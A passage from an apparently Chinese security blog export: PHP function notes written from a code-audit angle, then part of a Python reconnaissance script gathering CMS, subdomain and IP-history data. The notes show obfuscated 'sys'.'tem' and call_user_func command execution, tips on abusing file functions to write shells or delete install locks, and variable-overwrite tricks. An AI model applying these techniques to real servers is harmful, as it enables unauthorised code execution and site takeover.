\&quot;$str\&quot;;&quot;);echo $str. &quot;\n&quot;;?&gt; </code></pre><p><strong>输出：</strong><br><code>This is a $string with my $name in it.</code><br><code>This is a cup with my coffee in it.</code></p><hr><p><strong>explode()函数:</strong></p><blockquote><p>也就是拆分</p></blockquote><p><img src="http://static.zybuluo.com/1kbfree/tg27cykixmiyflsw0dofm2bw/image_1ca61lt671266hda1loq1om3gr411.png" alt="image_1ca61lt671266hda1loq1om3gr411.png-28.6kB"></p><hr><p><strong>copy()函数:</strong></p><p><code>copy(source,destination)</code><br>参数 |    描述<br>:-:  | :-:<br>source | 必需。规定要复制的文件。<br>destination | 必需。规定复制文件的目的地。</p><p><strong>将文件从 source 拷贝到 destination。如果成功则返回 TRUE，否则返回 FALSE。</strong></p><hr><p><strong>trim()函数:</strong><br>移除字符串两侧的空格等特殊字符<br><img src="http://static.zybuluo.com/1kbfree/kn3q9kwiadvmp2238ix16c7r/image_1capbh1qhm8vhmp1nu212q7100hm.png" alt="移除字符串两侧的空格等特殊字符.png-14.7kB"></p><hr><p><strong>strcasecmp()函数:</strong><br><img src="http://static.zybuluo.com/1kbfree/iaqdvoetw2l610xgofrbqdje/image_1calh2fsf1pjn50b1nh11h0v1v3d9.png" alt="image_1calh2fsf1pjn50b1nh11h0v1v3d9.png-39.5kB"></p><hr><h1 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式:"></a>正则表达式:</h1><p><strong>preg_match()函数:</strong><br><img src="http://static.zybuluo.com/1kbfree/xo7lxkjibn4xcrha7t4basxn/image_1calhpof417poa9m1982vhh4n113.png" alt="preg_match函数的参数介绍"></p><p><strong>匹配一下<code>i</code>：</strong><br><img src="http://static.zybuluo.com/1kbfree/4d3lofhh58j9i4d4hkm12gsj/image_1cb2e316g1k9mdevmb11v3v15sm2a.png" alt="image_1cb2e316g1k9mdevmb11v3v15sm2a.png-16.9kB"></p><p>这里的<code>//</code>是定界符 ，之需要二处字符一样就可以，比如<code>== -- ?? 等等</code> 但是有些不能做定位符 比如a到z、A到Z、0到9、空格、<code>\</code></p><p><strong>匹配全部英文字母(包括大写)：</strong><br><img src="http://static.zybuluo.com/1kbfree/3n619fqv4ix1af43vwtkffu7/image_1cb2e8ben2u160k1kuktn1n792n.png" alt="image_1cb2e8ben2u160k1kuktn1n792n.png-33kB"></p><p><strong>替换匹配到的内容:</strong><br><img src="http://static.zybuluo.com/1kbfree/9r393wz9lhgio1y8dmamo7pk/image_1cb2ej8kv1l2loph4hd2480l3h.png" alt="image_1cb2ej8kv1l2loph4hd2480l3h.png-20kB"></p><hr><p><strong>define()函数：</strong><br><img src="http://static.zybuluo.com/1kbfree/0sm19cmcccdtny7e32qjs4ud/image_1cau24b5jgimn6h6ge7sd8u19.png" alt="image_1cau24b5jgimn6h6ge7sd8u19.png-19.7kB"></p><pre><code>define(name,value,case_insensitive)</code></pre><table><thead><tr><th style="text-align:center">参数</th><th style="text-align:center">描叙</th></tr></thead><tbody><tr><td style="text-align:center">name</td><td style="text-align:center">必需。规定常量的名称。</td></tr><tr><td style="text-align:center">value</td><td style="text-align:center">必需。规定常量的值。</td></tr><tr><td style="text-align:center">case_insensitive</td><td style="text-align:center">可选。规定常量的名称是否对大小写敏感。</td></tr></tbody></table><p><em>若设置为 true，则对变量名大小写不敏感。默认是 false（大小写敏感）。</em></p><hr><p><strong>dirname()函数：</strong><br><img src="http://static.zybuluo.com/1kbfree/mxnhnvrlstywezjh66otbbck/image_1cau2i80e2ag1rp5a721pak1ku4m.png" alt="image_1cau2i80e2ag1rp5a721pak1ku4m.png-39.5kB"><br><code>dirname(path)</code><br>参数|描述<br>:–:|:–:<br>path|必需。规定要检查的路径。</p><p><em>该函数返回去掉文件名后的目录名</em></p><hr><p><strong>iconv()函数：</strong><br><img src="http://static.zybuluo.com/1kbfree/o51s3916gtn2hfrfzr1xn3yy/image_1cau44qdgb61h0u119k11ok1rda1g.png" alt="image_1cau44qdgb61h0u119k11ok1rda1g.png-60.5kB"><br><code>iconv ( in_charset , out_charset , str )</code><br>将字符串 str 从 in_charset 转换编码到 out_charset。 </p><p><strong>intval()函数:</strong><br><img src="http://static.zybuluo.com/1kbfree/odelzzq42smp1ujet5mx99os/image_1calj80va17dali6obj1bsj1371n.png" alt="image_1calj80va17dali6obj1bsj1371n.png-70.2kB"><br><em>还可以当防止SQL注入:</em><br><img src="http://static.zybuluo.com/1kbfree/me7ctcznhnh9vjhsgj1sx80v/image_1cartbh4v1thh1egn1iga1fcinu1g.png" alt="image_1cartbh4v1thh1egn1iga1fcinu1g.png-14.6kB"></p><hr><p><strong>reset()函数:</strong><br><img src="http://static.zybuluo.com/1kbfree/xefi1xpy95wf4er90jqv8nci/image_1camn387gtjs1pj6imq18fmoap.png" alt="image_1camn387gtjs1pj6imq18fmoap.png-57.2kB"></p><hr><p><strong>$$变量覆盖:</strong><br><img src="http://static.zybuluo.com/1kbfree/iu6dbthijovu3ek690s9ml8k/image_1campm57rug6ul5e76u4h1ij216.png" alt="image_1campm57rug6ul5e76u4h1ij216.png-36.5kB"></p><p><strong>还有一个很有趣的：</strong></p><pre><code>&lt;?php    $g = &#39;_GET&#39;;    $g = $$g; //这个时候$$g的第二个$与$g的值拼接了变成了$_GET，第一个$变成了$g，所以$g=$_GET    echo $g[&#39;name&#39;];?&gt;</code></pre><p><img src="http://static.zybuluo.com/1kbfree/b9lobeeywliqdiruv21fk0x9/image_1cckvtnv0fkgv9volmk581ue5m.png" alt="image_1cckvtnv0fkgv9volmk581ue5m.png-62.9kB"></p><hr><p><strong>isset()函数:检测变量是否已设置并且非 NULL</strong><br><strong>unset()函数:释放给定的变量</strong></p><hr><p><strong>parse_ini_file()  解析一个配置文件。</strong></p><pre><code>array parse_ini_file ( string $filename [, bool $process_sections = false [, int $scanner_mode = INI_SCANNER_NORMAL ]] )</code></pre><p>载入一个由 filename 指定的 ini 文件，并将其中的设置作为一个联合数组返回。</p><table><thead><tr><th style="text-align:center">参数</th><th style="text-align:center">用法</th></tr></thead><tbody><tr><td style="text-align:center">filename</td><td style="text-align:center">要解析的 ini 文件的文件名。</td></tr><tr><td style="text-align:center">process_sections</td><td style="text-align:center">如果将最后的 process_sections 参数设为 TRUE，将得到一个多维数组，包括了配置文件中每一节的名称和设置。process_sections 的默认值是 FALSE。</td></tr><tr><td style="text-align:center">scanner_mode</td><td style="text-align:center">Can either be INI_SCANNER_NORMAL (default) or INI_SCANNER_RAW. If INI_SCANNER_RAW is supplied, then option values will not be parsed.</td></tr></tbody></table><blockquote><p>返回值： 成功时以关联数组 array 返回设置，失败时返回 FALSE。</p></blockquote><hr><p><strong>urldecode()函数，可能会造成urldecode二次注入：</strong><br><img src="http://static.zybuluo.com/1kbfree/vckacpis6uv1zy6cq7x6z4ef/image_1cao633k6105ecv99s4pre14129.png" alt="image_1cao633k6105ecv99s4pre14129.png-32.1kB"></p><hr><p><strong>$_FILES用法:</strong><br><img src="http://static.zybuluo.com/1kbfree/5xn30q6ctgadfuuk8s2jhrda/image_1cb241vvp1ls511el1umg44v1oqi9.png" alt="image_1cb241vvp1ls511el1umg44v1oqi9.png-42.7kB"></p><p><img src="http://static.zybuluo.com/1kbfree/p6mqk381schtf7hjo84aimmx/image_1cb242979174ttbvod71k31e97m.png" alt="image_1cb242979174ttbvod71k31e97m.png-43.3kB"></p><p><img src="http://static.zybuluo.com/1kbfree/4zvsf8i84xbn8gqb9v51rzj4/image_1cb2494dpm70155kdea1i1217um13.png" alt="image_1cb2494dpm70155kdea1i1217um13.png-117.7kB"></p><hr><p><strong>is_numeric()函数：</strong></p><blockquote><p>判断是否为数字，是返回1，不是返回空</p></blockquote><p><img src="http://static.zybuluo.com/1kbfree/a425da6hg4dejq3orru2x19m/image_1cao6u6q0cd76121e244i910gm.png" alt="image_1cao6u6q0cd76121e244i910gm.png-24.7kB"></p><hr><p><strong>dvwa的sql注入的impossible等级源码(dvwa的impossible不存在sql注入)：</strong><br><img src="http://static.zybuluo.com/1kbfree/oz8rvt3lijvznmq5htw60vwg/image_1cao7j7051cek133f1oku1ek51vc13.png" alt="image_1cao7j7051cek133f1oku1ek51vc13.png-47.7kB"><br><em>当然  我看不懂这几行:</em></p><pre><code>$data = $db-&gt;prepare( &#39;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&#39; );$data-&gt;bindParam( &#39;:id&#39;, $id, PDO::PARAM_INT );</code></pre><hr><p><strong>substr()函数:</strong></p><pre><code>&lt;?php$rest = substr(&quot;abcdef&quot;, -1);    // 返回 &quot;f&quot;$rest = substr(&quot;abcdef&quot;, -2);    // 返回 &quot;ef&quot;$rest = substr(&quot;abcdef&quot;, -3, 1); // 返回 &quot;d&quot;$rest = substr(&quot;abcdef&quot;, 0, -1);  // 返回 &quot;abcde&quot;$rest = substr(&quot;abcdef&quot;, 2, -1);  // 返回 &quot;cde&quot;$rest = substr(&quot;abcdef&quot;, 4, -4);  // 返回 &quot;&quot;$rest = substr(&quot;abcdef&quot;, -3, -1); // 返回 &quot;de&quot;?&gt;</code></pre><hr><p><strong>strrpos()函数:</strong></p><pre><code>&lt;?php$foo = &quot;0123456789a123456789b123456789c&quot;;var_dump(strrpos($foo, &#39;7&#39;, -5));  // 从尾部第 5 个位置开始查找                                   // 结果: int(17)var_dump(strrpos($foo, &#39;7&#39;, 20));  // 从第 20 个位置开始查找                                   // 结果: int(27)var_dump(strrpos($foo, &#39;7&#39;, 28));  // 结果: bool(false)?&gt;</code></pre><hr><p><strong>extract()函数：</strong><br><img src="http://static.zybuluo.com/1kbfree/w6zu2eq6hu95plscwo6eipwo/image_1capb8b1l16th19ectna124m6sp9.png" alt="image_1capb8b1l16th19ectna124m6sp9.png-46.6kB"></p><hr><p><strong>常见语法：</strong></p><pre><code>if(empty($a)) $a = &#39;hello world&#39;; //如果$a为空，那么它的值为hello world</code></pre><pre><code>$s = &#39;sys&#39;.&#39;tem&#39;;$s(&#39;whoami&#39;); //返回desktop-a0iqkh2\iamfree/*这里就是执行了whoami的命令*/</code></pre><hr><p><strong>匿名函数：</strong></p><pre><code>$C_F = create_function(&#39;$name&#39;,&#39;return $name;&#39;); //$name的位置是传递什么参数，第二个参数是函数里执行什么代码echo $C_F(&#39;iamfree&#39;); //输出iamfree</code></pre><hr><p><strong>回调函数：</strong></p><pre><code>function Func($name){    echo &quot;hello $name&quot;;}call_user_func(&#39;Func&#39;,&#39;iamfree&#39;); /*输出:hello iamfree*/</code></pre><pre><code>call_user_func(&#39;system&#39;,&#39;whoami&#39;);/*输出：desktop-a0iqkh2\iamfree*/</code></pre><hr><p><strong>命令执行函数：</strong></p><ul><li>exec() — 执行一个外部程序</li><li>passthru() — 执行外部程序并且显示原始输出</li><li>proc_open() — 执行一个命令，并且打开用来输入/输出的文件指针。</li><li>shell_exec() &amp; <code></code> — 通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回。</li><li>system() — 执行外部程序，并且显示输出</li><li>popen() — 通过 popen() 的参数传递一条命令，并对 popen() 所打开的文件进行执行。</li></ul><p><img src="http://static.zybuluo.com/1kbfree/a7jyan6kwd7dig28zvx5zzmc/image_1carr8bt51nu8inj1ovq1b3nai79.png" alt="image_1carr8bt51nu8inj1ovq1b3nai79.png-42.6kB"></p><hr><p><strong>文件操作函数：</strong></p><ul><li>copy — 拷贝文件</li><li>file_get_contents — 将整个文件读入一个字符串</li><li>file_put_contents — 将一个字符串写入文件</li><li>file — 把整个文件读入一个数组中</li><li>fopen — 打开文件或者 URL</li><li>move_uploaded_file — 将上传的文件移动到新位置</li><li>readfile — 输出文件</li><li>rename — 重命名一个文件或目录</li><li>rmdir — 删除目录</li><li>unlink &amp; delete — 删除文件</li></ul><blockquote><p>任意文件读取、写入、删除往往是上面几个函数受到了控制（当然还有其他的函数）。<br>不同的函数在不同的场景有不同的作用和不同的利用手法。<br>读取：可以读取配置等文件，拿到key<br>写入：可以写入shell代码相关的内容<br>删除：可以删除.lock文件而可以重新安装覆盖</p></blockquote><p><img src="http://static.zybuluo.com/1kbfree/ivg4xj91uyloaum2nyx2fsj2/image_1carrl00k1f4isqn1kthuu9o4rm.png" alt="image_1carrl00k1f4isqn1kthuu9o4rm.png-389.2kB"></p><hr><h2 id="特殊函数"><a href="#特殊函数" class="headerlink" title="特殊函数"></a>特殊函数</h2><h3 id="信息泄漏"><a href="#信息泄漏" class="headerlink" title="信息泄漏"></a>信息泄漏</h3><p><code>bool phpinfo ([ int $what = INFO_ALL ] )</code><br>输出 PHP 当前状态的大量信息，包含了PHP编译选项、启用的扩展、PHP版本、服务器信息和环境变量（如果编译为一个模块的话）、PHP环境变量、操作系统版本信息、path变量、配置选项的本地值和主值、HTTP头和PHP授权信息(License)。</p><h3 id="软连接-读取文件内容"><a href="#软连接-读取文件内容" class="headerlink" title="软连接-读取文件内容"></a>软连接-读取文件内容</h3><p><code>bool symlink ( string $target , string $link )</code><br><code>symlink()</code> 对于已有的 target 建立一个名为 link 的符号连接。<br><code>string readlink ( string $path )</code><br><code>readlink()</code> 和同名的 C 函数做同样的事，返回符号连接的内容。</p><h3 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h3><p><code>string getenv ( string $varname )</code><br><strong>获取一个环境变量的值。</strong><br><code>bool putenv ( string $setting )</code><br><strong>添加 setting 到服务器环境变量。 环境变量仅存活于当前请求期间。</strong> 在请求结束时环境会恢复到初始状态。</p><h3 id="加载扩展"><a href="#加载扩展" class="headerlink" title="加载扩展"></a>加载扩展</h3><p><code>bool dl ( string $library )</code><br>载入指定参数 library 的 PHP 扩展。</p><p><strong>配置相关</strong><br><code>string ini_get ( string $varname )</code></p><p><strong>成功时返回配置选项的值。</strong></p><pre><code>string ini_set ( string $varname , string $newvalue )string ini_alter ( string $varname , string $newvalue )</code></pre><p>设置指定配置选项的值。这个选项会在脚本运行时保持新的值，并在脚本结束时恢复。<br><code>void ini_restore ( string $varname )</code><br>恢复指定的配置选项到它的原始值。</p><p><strong>数字判断</strong><br><code>bool is_numeric ( mixed $var )</code><br>如果 var 是数字和数字字符串则返回 TRUE，否则返回 FALSE。<br>仅用is_numeric判断而不用intval转换就有可能插入16进制的字符串到数据库，进而可能导致sql二次注入。</p><p><strong>数组相关</strong><br><code>bool in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] )</code><br>在 haystack 中搜索 needle，如果没有设置 strict 则使用宽松的比较。<br>该函数有一个特性，比较之前会进行自动类型转换。<br><code>in_array($str,$arr)判断$str是否在$arr数组里</code><br><img src="http://static.zybuluo.com/1kbfree/jx7080p95vigv0hnpfkgnu8u/image_1cartm29n1seoieq1o52b2qbn72d.png" alt="image_1cartm29n1seoieq1o52b2qbn72d.png-28.9kB"></p><h3 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h3><p><strong>如果 str 是 URL 传递入的查询字符串（query string），则将它解析为变量并设置到当前作用域：</strong><br><code>void parse_str ( string $str [, array &amp;$arr ] )</code><br><strong>本函数用来将变量从数组中导入到当前的符号表中。检查每个键名看是否可以作为一个合法的变量名，同时也检查和符号表中已有的变量名的冲突：</strong><br><code>int extract ( array &amp;$var_array [, int $extract_type = EXTR_OVERWRITE [, string $prefix = NULL ]] )</code></p><p><code>bool mb_parse_str ( string $encoded_string [, array &amp;$result ] )</code><br>解析 <code>GET/POST/COOKIE</code> 数据并设置全局变量。 由于 PHP 不提供原始 POST/COOKIE 数据，目前它仅能够<br>用于 GET 数据。 它解析了 URL 编码过的数据，检测其编码，并转换编码为内部编码，然后设置其值为 array<br>的 result 或者全局变量。<br><code>bool import_request_variables ( string $types [, string $prefix ] )</code><br>将 <code>GET／POST／Cookie</code> 变量导入到全局作用域中。如果你禁止了 <code>register_globals</code>，但又想用到一些全局变<br>量，那么此函数就很有用。</p><pre><code>&lt;?php$str = &quot;first=value&amp;arr[]=foo+bar&amp;arr[]=baz&quot;;// 推荐用法parse_str($str, $output);echo $output[&#39;first&#39;];  // valueecho $output[&#39;arr&#39;][0]; // foo barecho $output[&#39;arr&#39;][47]; // baz// 不建议这么用parse_str($str);echo $first;  // valueecho $arr[0]; // foo barecho $arr[1]; // baz?&gt;</code></pre><h3 id="列目录"><a href="#列目录" class="headerlink" title="列目录"></a>列目录</h3><p><code>array glob ( string $pattern [, int $flags = 0 ] )</code><br>glob() 函数依照 libc glob() 函数使用的规则寻找所有与 pattern 匹配的文件路径，类似于一般shell所用的规则一样。不进行缩写扩展或参数替代。<br><img src="http://static.zybuluo.com/1kbfree/osbwswf3zlroqoo14rq9jjfj/image_1caru9aiu1a5v1qr2p7m1pjlpjq2q.png" alt="image_1caru9aiu1a5v1qr2p7m1pjlpjq2q.png-46.9kB"><br><code>var_dump(glob(&#39;c*.php&#39;)); //列出c开头的PHP文件</code></p><h3 id="无参数获取信息"><a href="#无参数获取信息" class="headerlink" title="无参数获取信息"></a>无参数获取信息</h3><p><strong>返回一个包含所有已定义变量列表的多维数组，这些变量包括环境变量、服务器变量和用户定义的变量:</strong><br><code>array get_defined_vars ( void )</code><br><strong>返回当前所有已定义的常量名和值。 这包含 define() 函数所创建的，也包含了所有扩展所创建的:</strong><br><code>array get_defined_constants ([ bool $categorize = false ] )</code><br><strong>返回一个包含所有已定义函数列表的多维数组:</strong><br><code>array get_defined_functions ( void )</code><br><strong>返回所有被 include、 include_once、 require 和 require_once:</strong><br><code>array get_included_files ( void )</code></p><p><img src="http://static.zybuluo.com/1kbfree/v8vegj7d7ahhxafqer3gdx7s/image_1carv1gbf9am1c0rnic1gs9156f37.png" alt="image_1carv1gbf9am1c0rnic1gs9156f37.png-218.1kB"></p><hr><p><strong>rand()函数:</strong><br><img src="http://static.zybuluo.com/1kbfree/uv0q2objv84c5sm4z37sk41e/image_1carsup0fqrg1uipj1q1oeb1okv13.png" alt="image_1carsup0fqrg1uipj1q1oeb1okv13.png-29.6kB"></p><hr><p><strong>$_REQUEST用法：</strong><br><img src="http://static.zybuluo.com/1kbfree/oce7sp8x0ykgb7ju4x6shxhl/image_1cb26fq2i1upk16alpd18eb8pg1g.png" alt="image_1cb26fq2i1upk16alpd18eb8pg1g.png-30kB"></p><hr><p><strong>file_exists()函数：</strong><br>检查文件或目录是否存在<br><img src="http://static.zybuluo.com/1kbfree/5g83d66qgky6x3w7ws87h8oh/image_1cauetnlg17n874k1qqf11suk537.png" alt="image_1cauetnlg17n874k1qqf11suk537.png-34.8kB"></p><hr><p><strong>exit用法：</strong><br><img src="http://static.zybuluo.com/1kbfree/2dqkjyv4nuqlkmjkianj3b6j/image_1caufp0at1lt18k71uqkhg51eab3k.png" alt="image_1caufp0at1lt18k71uqkhg51eab3k.png-181.2kB"><br><em>多处用在<code>install.php</code>里，因为成功安装一次之后就能再一次运行安装了，除非将exit删除了。</em></p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息收集辅助脚本(python3)</title>
      <link href="/2018/12/26/xin-xi-shou-ji-fu-zhu-jiao-ben-python3/"/>
      <url>/2018/12/26/xin-xi-shou-ji-fu-zhu-jiao-ben-python3/</url>
      
        <content type="html"><![CDATA[<h3 id="腳本介紹"><a href="#腳本介紹" class="headerlink" title="腳本介紹"></a>腳本介紹</h3><p>脚本是博主自己写的，博主承认自己写的很烂，超级烂，不过还是慢慢的完善吧~<br>目前可以有如下几点</p><ul><li>CMS识别</li><li>子域名获取</li><li>IP历史解析记录获取</li><li>多线程</li><li>输出人性化（输出的内容是<code>.html</code>，并且使用<code>bootstrap</code>框架写的虽然还是很丑但看的过去）</li><li>编不下去了。。。</li></ul><h3 id="脚本代码"><a href="#脚本代码" class="headerlink" title="脚本代码"></a>脚本代码</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> threading<span class="token keyword">from</span> bs4 <span class="token keyword">import</span> BeautifulSoup<span class="token keyword">import</span> re<span class="token keyword">import</span> timeurl <span class="token operator">=</span> input<span class="token punctuation">(</span> <span class="token string">'url(如baidu.com): '</span> <span class="token punctuation">)</span>head<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'User-Agent'</span><span class="token punctuation">:</span><span class="token string">'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0'</span><span class="token punctuation">}</span>ip <span class="token operator">=</span> <span class="token string">'http://site.ip138.com/{}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span> url <span class="token punctuation">)</span>domain_url <span class="token operator">=</span> url<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span>domain_url <span class="token operator">=</span> domain_url<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">'.'</span><span class="token operator">+</span>domain_url<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>domain <span class="token operator">=</span> <span class="token string">'http://site.ip138.com/{}/domain.htm'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span> domain_url <span class="token punctuation">)</span>t <span class="token operator">=</span> time<span class="token punctuation">.</span>strftime<span class="token punctuation">(</span><span class="token string">"%Y-%m-%d"</span><span class="token operator">+</span><span class="token string">'_'</span><span class="token punctuation">,</span> time<span class="token punctuation">.</span>localtime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>html_file <span class="token operator">=</span> open<span class="token punctuation">(</span> url<span class="token operator">+</span><span class="token string">'_'</span><span class="token operator">+</span>t<span class="token operator">+</span><span class="token string">'.html'</span><span class="token punctuation">,</span><span class="token string">'w'</span> <span class="token punctuation">)</span>html_file<span class="token punctuation">.</span>write<span class="token punctuation">(</span> <span class="token triple-quoted-string string">'''&lt;head>&lt;title>%s的扫描结果&lt;/title>&lt;link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/3.3.7/css/bootstrap.min.css">&lt;script src="https://cdn.staticfile.org/jquery/2.1.1/jquery.min.js">&lt;/script>&lt;script src="https://cdn.staticfile.org/twitter-bootstrap/3.3.7/js/bootstrap.min.js">&lt;/script>&lt;style>pre{margin: 0 0 0px;}&lt;/style>&lt;/head>&lt;ul id="myTab" class="nav nav-tabs navbar-fixed-top navbar navbar-default">    &lt;li class="active">        &lt;a href="#ip" data-toggle="tab">             IP历史解析        &lt;/a>    &lt;/li>    &lt;li>&lt;a href="#cms" data-toggle="tab">CMS识别&lt;/a>&lt;/li>    &lt;li>&lt;a href="#domain" data-toggle="tab">子域名信息&lt;/a>&lt;/li>&lt;/ul>&lt;br>&lt;br>&lt;br>&lt;br>&lt;div id="myTabContent" class="tab-content">'''</span><span class="token operator">%</span>url <span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">IP</span><span class="token punctuation">(</span> threading<span class="token punctuation">.</span>Thread <span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> ip<span class="token punctuation">)</span><span class="token punctuation">:</span>        threading<span class="token punctuation">.</span>Thread<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>ip <span class="token operator">=</span> ip    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span> self<span class="token punctuation">.</span>ip<span class="token punctuation">,</span>headers <span class="token operator">=</span> head <span class="token punctuation">)</span>        html <span class="token operator">=</span> r<span class="token punctuation">.</span>text        bs <span class="token operator">=</span> BeautifulSoup<span class="token punctuation">(</span>html<span class="token punctuation">,</span> <span class="token string">"html.parser"</span><span class="token punctuation">)</span>        html_file<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'&lt;div class="tab-pane fade in active" id="ip">'</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> bs<span class="token punctuation">.</span>find_all<span class="token punctuation">(</span><span class="token string">'p'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            ipc <span class="token operator">=</span> i<span class="token punctuation">.</span>get_text<span class="token punctuation">(</span><span class="token punctuation">)</span>            ip_html <span class="token operator">=</span> <span class="token string">'&lt;pre>{}&lt;/pre>'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span> ipc <span class="token punctuation">)</span>            html_file<span class="token punctuation">.</span>write<span class="token punctuation">(</span> ip_html <span class="token punctuation">)</span>        html_file<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'&lt;/div>'</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">CMS</span><span class="token punctuation">(</span> threading<span class="token punctuation">.</span>Thread <span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> cms<span class="token punctuation">)</span><span class="token punctuation">:</span>        threading<span class="token punctuation">.</span>Thread<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>cms <span class="token operator">=</span> cms    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        cms <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">'http://whatweb.bugscaner.com/what/'</span><span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'url'</span><span class="token punctuation">:</span> self<span class="token punctuation">.</span>cms<span class="token punctuation">}</span><span class="token punctuation">,</span> headers <span class="token operator">=</span> head<span class="token punctuation">)</span>        text <span class="token operator">=</span> cms<span class="token punctuation">.</span>text        Web_Frameworks <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'"Web Frameworks": "(.*?)"]'</span><span class="token punctuation">,</span> text<span class="token punctuation">)</span>        Programming_Languages <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'"Programming Languages":(.*?)"]'</span><span class="token punctuation">,</span> text<span class="token punctuation">)</span>        JavaScript_Frameworks <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'"JavaScript Frameworks": (.*?)"]'</span><span class="token punctuation">,</span> text<span class="token punctuation">)</span>        CMS <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'"CMS": (.*?)"]'</span><span class="token punctuation">,</span> text<span class="token punctuation">)</span>        Web_Server <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'"Web Servers": (.*?)"]'</span><span class="token punctuation">,</span> text<span class="token punctuation">)</span>        <span class="token keyword">if</span> CMS<span class="token punctuation">:</span>            CMS <span class="token operator">=</span> CMS<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'"]'</span>        <span class="token keyword">if</span> Programming_Languages<span class="token punctuation">:</span>            Programming_Languages <span class="token operator">=</span> Programming_Languages<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'"]'</span>        <span class="token keyword">if</span> JavaScript_Frameworks<span class="token punctuation">:</span>            JavaScript_Frameworks <span class="token operator">=</span> JavaScript_Frameworks<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'"]'</span>        <span class="token keyword">if</span> Web_Frameworks<span class="token punctuation">:</span>            Web_Frameworks <span class="token operator">=</span> Web_Frameworks<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'"]'</span>        <span class="token keyword">if</span> Web_Server<span class="token punctuation">:</span>            Web_Server <span class="token operator">=</span> Web_Server<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'"]'</span>        html <span class="token operator">=</span> <span class="token triple-quoted-string string">'''        &lt;div class="tab-pane fade" id="cms">        &lt;div class="table-responsive">        &lt;table class="table table-condensed">           &lt;tr>            &lt;th>web框架&lt;/th>            &lt;th>脚本版本&lt;/th>            &lt;th>JavaScript框架&lt;/th>            &lt;th>CMS框架&lt;/th>            &lt;th>web服务器&lt;/th>          &lt;/tr>          &lt;tr>            &lt;td>{0}&lt;/td>            &lt;td>{1}&lt;/td>            &lt;td>{2}&lt;/td>            &lt;td>{3}&lt;/td>            &lt;td>{4}&lt;/td>          &lt;/tr>        &lt;/table>        &lt;/div>        &lt;/div>        '''</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>Web_Frameworks<span class="token punctuation">,</span>Programming_Languages<span class="token punctuation">,</span>JavaScript_Frameworks<span class="token punctuation">,</span>CMS<span class="token punctuation">,</span>Web_Server<span class="token punctuation">)</span>        html_file<span class="token punctuation">.</span>write<span class="token punctuation">(</span> html <span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">DOMAIN</span><span class="token punctuation">(</span> threading<span class="token punctuation">.</span>Thread <span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> domain<span class="token punctuation">)</span><span class="token punctuation">:</span>        threading<span 